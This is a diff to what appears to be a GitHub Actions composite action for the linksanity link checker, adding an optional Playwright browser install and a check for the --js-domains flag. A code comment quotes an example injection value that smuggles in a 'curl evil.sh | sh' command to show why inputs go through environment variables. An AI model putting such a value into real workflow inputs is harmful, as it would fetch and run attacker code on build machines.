@@ -35,6 +35,10 @@ inputs:
     description: Whether to upload the scan results file as a workflow artifact ("true"/"false").
     required: false
     default: "true"
+  browser:
+    description: Whether to install the Playwright browser extra, required for --js-domains ("true"/"false"). Adds a Chromium download to the run.
+    required: false
+    default: "false"
 
 outputs:
   broken-count:
@@ -58,11 +62,21 @@ runs:
       # a value like `x"; curl evil.sh | sh; :"` would otherwise execute.
       env:
         VERSION: ${{ inputs.version }}
+        BROWSER: ${{ inputs.browser }}
       run: |
-        if [ -n "$VERSION" ]; then
-          pip install "linksanity==$VERSION"
+        if [ "$BROWSER" = "true" ]; then
+          if [ -n "$VERSION" ]; then
+            pip install "linksanity[browser]==$VERSION"
+          else
+            pip install "linksanity[browser]"
+          fi
+          playwright install --with-deps chromium
         else
-          pip install "linksanity"
+          if [ -n "$VERSION" ]; then
+            pip install "linksanity==$VERSION"
+          else
+            pip install "linksanity"
+          fi
         fi
 
     - name: Run scan
@@ -74,7 +88,17 @@ runs:
         SKIP_URLS: ${{ inputs.skip-urls }}
         OUTPUT: ${{ inputs.output }}
         EXTRA_ARGS: ${{ inputs.args }}
+        BROWSER: ${{ inputs.browser }}
       run: |
+        if [ "$BROWSER" != "true" ]; then
+          case "$EXTRA_ARGS" in
+            *--js-domains*)
+              echo "::error::--js-domains requires Playwright. Set \`browser: true\` on this action to install it."
+              exit 1
+              ;;
+          esac
+        fi
+
         flags=""
         if [ "$CHECK_ANCHORS" = "true" ]; then
           flags="$flags --check-anchors"
